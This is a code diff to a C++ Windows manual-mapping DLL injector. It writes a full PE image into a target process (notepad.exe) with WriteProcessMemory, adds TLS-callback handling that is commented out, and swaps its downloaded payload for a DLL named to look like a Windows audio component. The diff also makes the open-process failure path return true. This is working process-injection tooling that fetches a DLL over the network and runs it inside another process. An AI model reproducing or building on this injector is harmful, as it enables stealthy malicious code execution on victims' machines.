@@ -7,7 +7,7 @@
 #define DEBUG_HEADERS 0
 #define DEBUG_SECTIONS 0
 #define DEBUG_RELOC 0
-#define DEBUG_IMPORTS 1
+#define DEBUG_IMPORTS 0
 
 LPCSTR dllPath_n = "network_lib.dll";
 
@@ -87,7 +87,7 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
     if (!hProcess)
     {
         std::cerr << "Failed to open process: " << GetLastError() << std::endl;
-        return false;
+        return true;
     }
 
     //===================================================================================================
@@ -107,6 +107,9 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
 
     IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(fullImage.data() + importDir.VirtualAddress);
+    
+    IMAGE_DATA_DIRECTORY tlsDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    typedef VOID (WINAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved);
     
     //===================================================================================================
 
@@ -238,7 +241,7 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
 
 // Resolve imports
     
-    std::cout << std::endl << "-> Resolving imports" << std::endl << "Size: 0x" << std::hex << importDir.Size << std::dec << std::endl;
+    std::cout << std::endl << "-> Resolving imports" << std::endl << "importDir Size: 0x" << std::hex << importDir.Size << std::dec << std::endl;
     if (importDir.Size)
     {
         while (importDesc->Name)
@@ -249,7 +252,7 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
             {
                 std::cerr << "Failed to load library: " << libraryName << std::endl;
                 return false;
-            } std::cout << "-> Loaded library: " << libraryName << std::endl << std::endl;
+            } std::cout << "-> Loaded library: " << libraryName << std::endl;
 
             #ifdef _WIN64
                 IMAGE_THUNK_DATA64* originalFirstThunk = (IMAGE_THUNK_DATA64*)(fullImage.data() + importDesc->OriginalFirstThunk);
@@ -304,23 +307,99 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
             importDesc++;
         }
     }   std::cout << "\t[Imports resolved]" << std::endl;
+
+//======================================================================================================================================================================
+
+// Write full image to target process
+
+    if (!WriteProcessMemory(hProcess, remoteMem, fullImage.data(), fullImage.size(), nullptr))
+    {
+        std::cerr << "Failed to write full image to target process: " << GetLastError() << std::endl;
+        return false;
+    }
+    std::cout << "-> Full image injection complete" << std::endl;
     
 //======================================================================================================================================================================
 
-    // // Set memory protection for sections
+// TlsCallbacks
+
+    // if(tlsDir.Size == 0) 
+    // {
+    //     std::cout << "\n-> No TLS Dir found" << std::endl;
+    // }
+    // else
+    // {
+    //     #ifdef _WIN64
+            
+    //         IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(fullImage.data() + tlsDir.VirtualAddress);
+    //         if(!tls -> AddressOfCallBacks)
+    //         {
+    //             std::cout << "\n-> No TLS Callbacks found" << std::endl;   
+    //             return true;
+    //         }
+    //         ULONGLONG* callback = (ULONGLONG*)tls->AddressOfCallBacks;
+        
+    //     #else
+
+    //         IMAGE_TLS_DIRECTORY32* tls32 = (IMAGE_TLS_DIRECTORY32*)(fullImage.data() + tlsDir.VirtualAddress);
+    //         if (!tls32 -> AddressOfCallBacks) {
+    //             std::cout << "\n-> No TLS Callbacks found" << std::endl;
+    //             return true;
+    //         }
+    //         DWORD* callbacks = (DWORD*)tls32 -> AddressOfCallBacks;        
+
+    //     #endif
+
+    //     std::cout << "-> Executing TLS callbacks..." << std::endl;
+
+    //     while (true)
+    //     {
+    //         #ifdef _WIN64
+    //             ULONGLONG callbackAddr = *callback;
+    //             if (callbackAddr == 0) break;
+                
+    //             PIMAGE_TLS_CALLBACK tls_callback = (PIMAGE_TLS_CALLBACK)callbackAddr;
+    //             std::cout << "-> Calling TLS callback at address: 0x" << std::hex << (uintptr_t)tls_callback << std::dec << std::endl;
+                
+    //             tls_callback(fullImage.data(), DLL_PROCESS_ATTACH, nullptr);
+    //             callback++;
+    //         #else
+    //             DWORD callbackAddr = *callbacks;
+    //             if (callbackAddr == 0) break;
+                
+    //             PIMAGE_TLS_CALLBACK tls_callback = (PIMAGE_TLS_CALLBACK)callbackAddr;
+    //             std::cout << "-> Calling TLS callback at address: 0x" << std::hex << (uintptr_t)tls_callback << std::dec << std::endl;
+                
+    //             tls_callback(fullImage.data(), DLL_PROCESS_ATTACH, nullptr);
+    //             callbacks++;
+    //         #endif
+    //     }
+    //     std::cout << "\t[TLS callbacks executed]" << std::endl;
+    // }
+//======================================================================================================================================================================
+
+    // Set memory protection for sections
+
+    // std::cout << "\n\n-> Setting memory protection for sections" << std::endl << "No. of sections : " << ntHeaders->FileHeader.NumberOfSections << std::endl;
+
     // for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
     // {
     //     DWORD oldProtect;
     //     void* sectionAddr = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
     //     DWORD newProtect = PAGE_READONLY;
 
-    //     if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+    //     if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+    //         newProtect = PAGE_EXECUTE_READWRITE;
+    //     else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
     //         newProtect = PAGE_EXECUTE_READ;
     //     else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
     //         newProtect = PAGE_READWRITE;
 
     //     VirtualProtectEx(hProcess, sectionAddr, sectionHeader[i].Misc.VirtualSize, newProtect, &oldProtect);
+    //     std::cout << "-> memory permission set for section: " << sectionHeader[i].Name << "\t[" << oldProtect << "] -> [" << newProtect << "]" << std::endl;
     // }
+
+//======================================================================================================================================================================
 
     // // Call the entry point
     // void* entryPoint = (BYTE*)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
@@ -341,8 +420,8 @@ int main()
 {
     load_dll();
  
-    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
-    //std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
+    //std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+    std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
 
     std::cout << "Trying to get a handle to the process...\n"; 
     DWORD processID = GetProcessID(L"notepad.exe");
